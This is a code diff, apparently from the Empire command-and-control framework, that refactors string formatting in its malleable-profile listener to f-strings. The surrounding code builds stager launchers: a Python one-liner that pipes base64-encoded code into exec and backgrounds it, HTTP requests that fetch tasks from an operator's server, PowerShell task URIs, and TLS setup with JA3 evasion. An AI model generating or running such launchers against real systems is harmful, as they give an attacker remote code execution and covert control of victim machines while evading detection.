@@ -466,7 +466,7 @@ class Listener:
             if safeChecks and safeChecks.lower() == "true":
                 launcherBase += listener_util.python_safe_checks()
 
-            launcherBase += "server='%s'\n" % (host)
+            launcherBase += f"server='{host}'\n"
 
             # ==== CONFIGURE PROXY ====
             if proxy and proxy.lower() != "none":
@@ -523,10 +523,7 @@ class Listener:
 
             # ==== BUILD REQUEST ====
             launcherBase += "vreq=type('vreq',(urllib.request.Request,object),{'get_method':lambda self:self.verb if (hasattr(self,'verb') and self.verb) else urllib.request.Request.get_method(self)})\n"
-            launcherBase += "req=vreq('{}', {})\n".format(
-                profile.stager.client.url,
-                profile.stager.client.body,
-            )
+            launcherBase += f"req=vreq('{profile.stager.client.url}', {profile.stager.client.body})\n"
             launcherBase += "req.verb='" + profile.stager.client.verb + "'\n"
 
             # ==== ADD HEADERS ====
@@ -542,10 +539,7 @@ class Listener:
                 == malleable.Terminator.HEADER
             ):
                 launcherBase += "head=res.info().dict\n"
-                launcherBase += "a=head['{}'] if '{}' in head else ''\n".format(
-                    profile.stager.server.output.terminator.arg,
-                    profile.stager.server.output.terminator.arg,
-                )
+                launcherBase += f"a=head['{profile.stager.server.output.terminator.arg}'] if '{profile.stager.server.output.terminator.arg}' in head else ''\n"
                 launcherBase += "a=urllib.parse.unquote(a)\n"
             elif (
                 profile.stager.server.output.terminator.type
@@ -574,10 +568,7 @@ class Listener:
                 )
                 if isinstance(launchEncoded, bytes):
                     launchEncoded = launchEncoded.decode("UTF-8")
-                launcher = (
-                    "echo \"import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('%s'));\" | python3 &"
-                    % (launchEncoded)
-                )
+                launcher = f"echo \"import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('{launchEncoded}'));\" | python3 &"
                 return launcher
             else:
                 return launcherBase
@@ -882,7 +873,7 @@ $script:GetTask = {{
                     "$taskURI = "
                     + ",".join(
                         [
-                            "'%s'" % u
+                            f"'{u}'"
                             for u in (
                                 profile.get.client.uris
                                 if profile.get.client.uris
@@ -1008,7 +999,7 @@ $vWc.Proxy = $Script:Proxy;
                     "$taskURI = "
                     + ",".join(
                         [
-                            "'%s'" % u
+                            f"'{u}'"
                             for u in (
                                 profile.post.client.uris
                                 if profile.post.client.uris
@@ -1765,8 +1756,8 @@ class ExtendedPacketHandler(PacketHandler):
 
                 context = ssl.SSLContext(proto)
                 context.load_cert_chain(
-                    "%s/empire-chain.pem" % (certPath),
-                    "%s/empire-priv.key" % (certPath),
+                    f"{certPath}/empire-chain.pem",
+                    f"{certPath}/empire-priv.key",
                 )
 
                 if ja3_evasion:
